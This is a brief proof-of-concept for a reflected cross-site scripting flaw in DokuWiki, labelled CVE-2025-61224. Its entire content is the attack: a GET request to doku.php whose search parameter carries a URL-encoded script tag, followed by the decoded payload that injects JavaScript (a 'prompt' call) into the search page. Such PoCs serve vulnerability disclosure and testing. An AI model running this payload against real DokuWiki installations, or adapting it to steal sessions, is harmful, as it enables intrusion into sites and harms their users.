# DokuWiki
# CVE-2025-61224
***poc:***  *GET https://<host>/dokuwiki/doku.php?id=start&do=search&q=1%20%40%3Cscript%3Eprompt%60xss%60%3C%2fscript%3E*
***Payload:*** ```1 @<script>prompt`xss`</script>```
